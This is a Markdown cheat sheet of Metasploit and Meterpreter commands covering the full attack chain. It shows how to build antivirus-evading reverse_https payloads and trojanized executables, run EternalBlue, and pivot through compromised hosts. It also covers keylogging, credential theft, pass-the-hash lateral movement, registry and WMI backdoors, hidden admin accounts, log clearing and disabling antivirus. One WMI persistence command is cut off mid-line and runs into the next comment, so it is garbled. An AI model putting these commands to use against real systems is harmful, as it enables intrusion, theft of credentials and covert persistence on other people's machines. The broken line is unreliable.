# Meterpreter

### Initialize the database  
`msfdb init`  
### Connect from within msfconsole  
`msf6 > db_status`  
`msf6 > workspace -a project_name`  

### Module Tree and Classification System

```bash
modules/
├── auxiliary/ # Non-exploitation functionality
│ ├── scanner/
│ ├── admin/
│ └── dos/
├── encoders/ # Payload encoding to avoid detection
├── evasion/ # Specific anti-detection techniques
├── exploits/ # Categorized by target platform
│ ├── windows/
│ ├── linux/
│ ├── unix/
│ └── webapp/
├── nops/ # No-operation instructions
├── payloads/ # Code executed on target system
│ ├── singles/
│ ├── stagers/
│ └── stages/
└── post/ # Post-exploitation modules
  ├── windows/
  ├── linux/
  └── multi/

```

### Global Variables and Environmental Customization
```bash
# Set global variables for the session
msf6 > setg LHOST 192.168.1.100
msf6 > setg LPORT 4444
msf6 > setg VERBOSE true
# View all global variables
msf6 > getg
# Create persistent configuration
msf6 > save
# Create custom console prompt
msf6 > setg PROMPT "%red"+"msf6"+" %whi"+"${ACTIVE_WORKSPACE}"+" %ylw"+"> "
# Define custom aliases
msf6 > alias hs hosts
msf6 > alias sv services
msf6 > alias vl vulns
```

### Comprehensive Search Techniques

```bash
# Search by multiple criteria
msf6 > search name:windows type:exploit rank:excellent platform:windows
# Search with regular expressions
msf6 > search cve:2021 name:/smb|rdp|rce/ type:exploit
# Search for modules affecting specific service versions
msf6 > search apache name:2.4 type:exploit
# Search based on module reference ID
msf6 > search cve:2021-44228
# Search with advanced module metadata
msf6 > search disclosure:2021 type:exploit rank:excellent
```

### Advanced Exploitation Techniques
#### Payload Generation and Encoding Chains

```bash
# Generate a multi-encoded payload
msf6 > use payload/windows/meterpreter/reverse_https
msf6 payload(windows/meterpreter/reverse_https) > set LHOST 192.168.1.100
msf6 payload(windows/meterpreter/reverse_https) > set LPORT 443
msf6 payload(windows/meterpreter/reverse_https) > generate -e x86/shikata_ga_nai -i 10 -t exe -f encoded_payload.exe
# Chain multiple encoders with custom architecture
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 \
-e x86/shikata_ga_nai -i 5 \
-e x86/call4_dword_xor -i 3 \
-e x86/countdown -i 2 \
-f exe -o multi_encoded_payload.exe
# Use the template option for payload embedding
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 \
-e x86/shikata_ga_nai -i 8 \
-x /path/to/legitimate.exe \
-f exe -o trojanized_app.exe
```

#### Exploit Customization and Targeting

```bash
# Advanced options for exploit customization
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > show advanced
# Set precise targeting options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set GroomAllocations 12
msf6 exploit(windows/smb/ms17_010_eternalblue) > set GroomDelta 5
msf6 exploit(windows/smb/ms17_010_eternalblue) > set VerifyArch false
msf6 exploit(windows/smb/ms17_010_eternalblue) > set VerifyTarget false
msf6 exploit(windows/smb/ms17_010_eternalblue) > set MaxExploitAttempts 3
msf6 exploit(windows/smb/ms17_010_eternalblue) > set ProcessName lsass.exe
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

#### Session Management and Routing

```bash
# List all active sessions
msf6 > sessions -l
# Establish routes through compromised hosts
msf6 > sessions -i 1
meterpreter > run autoroute -s 10.10.0.0/16
# Alternative method for routing
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 10.10.0.0
msf6 post(multi/manage/autoroute) > set NETMASK 255.255.0.0
msf6 post(multi/manage/autoroute) > run
# View established routes
msf6 > route print
# Create a SOCKS proxy for pivoting
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > run -j
# Configure local tools to use the proxy
# Example proxychains.conf configuration:
# socks5 127.0.0.1 1080
```
#### Exploit Staging and Payload Handlers

```bash
# Set up persistent handler with advanced options
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST 192.168.1.100
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > set SessionCommunicationTimeout 300
msf6 exploit(multi/handler) > set SessionRetryTotal 3600
msf6 exploit(multi/handler) > set SessionRetryWait 10
msf6 exploit(multi/handler) > set HandlerSSLCert /path/to/cert.pem
msf6 exploit(multi/handler) > exploit -j
# Use stage encoding for AV evasion
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set StageEncoder x86/shikata_ga_nai
msf6 exploit(multi/handler) > set EnableStageEncoding true
msf6 exploit(multi/handler) > set StageEncodingFallback false
msf6 exploit(multi/handler) > exploit
```

### Meterpreter Advanced Techniques

#### Advanced Process Migration and Injection

```bash
# View current process information
meterpreter > ps
# Migrate to a specific process by ID
meterpreter > migrate 1234
# Find and migrate to a stable system process
meterpreter > run post/windows/manage/migrate
# Advanced migration with architecture specification
meterpreter > migrate -P explorer.exe -A x64
# Memory injection techniques
meterpreter > run post/windows/manage/reflective_dll_inject \
PROCESS=explorer.exe \
PATH=/path/to/payload.dll
# Execute shellcode in a remote process
meterpreter > execute -H -i -c -m -d notepad.exe -f /path/to/shellcode.bin
```

#### Comprehensive Privilege Escalation

```bash
# Automated privilege escalation checks
meterpreter > run post/multi/recon/local_exploit_suggester
# UAC bypass techniques
meterpreter > run post/windows/escalate/bypassuac
meterpreter > getsystem -t 3
# Token duplication and impersonation
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "DOMAIN\\Administrator"
# Persistent elevated access
meterpreter > run persistence -A -L C:\\Windows\\Temp -X -i 60 -p 443 -r 192.168.1.100
```

#### Advanced Filesystem and Registry Manipulation

```bash
# Mount remote shares for data exfiltration
meterpreter > use auxiliary/admin/smb/psexec_command
meterpreter > run post/windows/manage/mount
meterpreter > upload /tools/advanced_toolkit.exe C:\\Windows\\Temp
# Registry operations for persistence
meterpreter > reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -d 'C:\\Windows\\Temp\\payload.exe'
meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
# Timestomp to evade forensic analysis
meterpreter > timestomp C:\\Windows\\Temp\\payload.exe -f C:\\Windows\\explorer.exe
```

#### Network and Service Manipulation

```bash
# Port forwarding for internal service access
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.100
# ARP scanning from compromised host
meterpreter > run post/multi/gather/ping_sweep RHOSTS=10.10.10.0/24
# Manipulate Windows Firewall
meterpreter > run post/windows/manage/enable_rdp
meterpreter > run post/windows/manage/enable_psexec
# Keylogging and surveillance
meterpreter > keyscan_start
meterpreter > run post/windows/capture/keylog_recorder
# Extract saved credentials
meterpreter > run post/windows/gather/credentials/credential_collector
meterpreter > run post/multi/gather/firefox_creds
```

### Post-Exploitation Framework

#### Automated Intelligence Gathering

```bash
# Comprehensive host enumeration
meterpreter > run post/multi/gather/env
meterpreter > run post/windows/gather/enum_applications
meterpreter > run post/windows/gather/enum_services
meterpreter > run post/windows/gather/enum_patches
meterpreter > run post/windows/gather/enum_shares
meterpreter > run post/windows/gather/enum_domains
# Execute multiple post modules in sequence
msf6 > resource post_exploitation_windows.rc
# Content of post_exploitation_windows.rc
use post/windows/gather/enum_logged_on_users
set SESSION 1
run
use post/windows/gather/enum_domain_tokens
set SESSION 1
run
use post/windows/gather/credentials/domain_hashdump
set SESSION 1
run
```

#### Lateral Movement Techniques

```bash
# WMI-based lateral movement
msf6 > use exploit/windows/local/wmi
msf6 exploit(windows/local/wmi) > set SESSION 1
msf6 exploit(windows/local/wmi) > set SMBUSER Administrator
msf6 exploit(windows/local/wmi) > set SMBPASS P@ssw0rd
msf6 exploit(windows/local/wmi) > set SMBDOMAIN WORKGROUP
msf6 exploit(windows/local/wmi) > set RHOSTS 10.10.10.10
msf6 exploit(windows/local/wmi) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/wmi) > set LHOST 192.168.1.100
msf6 exploit(windows/local/wmi) > exploit
# PsExec with captured credentials
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.10.10-20
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set LHOST 192.168.1.100
msf6 exploit(windows/smb/psexec) > exploit
# Token-based access using Incognito
meterpreter > load incognito
meterpreter > list_tokens -g
meterpreter > steal_token 1234
meterpreter > execute -f cmd.exe -i -t -c -H
```

#### Persistent Access Implementation

```bash
# Registry-based persistence
meterpreter > run post/windows/manage/persistence_exe \
STARTUP=SERVICE \
REXENAME=system_service.exe \
REXEPATH=C:\\Windows\\System32 \
OPTIONS="-e x86/shikata_ga_nai -i 10 -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443"
# WMI event subscription persistence
meterpreter > run post/windows/manage/wmi_eventfilter \
SESSION=1 \
EVENTFILTER_NAME=SecurityCheck \
QUERYLANGUAGE=WQL \
QUERY="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=7" \
CONSUMER_TYPE=CommandLine \
CONSUMER_NAME=SecurityChecker \
COMMAND_LINE_TEMPLATE="%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -c \"IEX ([System.Text.Encoding# Backdoored Windows service
meterpreter > run post/windows/manage/backdoor_add_user \
USERNAME=maintenance \
PASSWORD=Password123! \
ADDTOGROUP=Administrators
```

#### Evidence Removal and Anti-forensics

```bash
# Clear Windows event logs
meterpreter > clearev
# Remove artifacts and logs
meterpreter > run post/windows/manage/delete_logs
# Securely delete files with multiple passes
meterpreter > run post/windows/manage/secure_delete \
FILES="C:\\Temp\\attack_notes.txt,C:\\Temp\\passwords.txt" \
PASSES=7 \
ZERO=true
# Disable Windows Defender and security tools
meterpreter > run post/windows/manage/killav
meterpreter > run post/windows/manage/disable_uac
```

### Port Forwarting

`portfwd`

### Routing

`run autoroute -s <other-ethernet-ip>` - pivoting
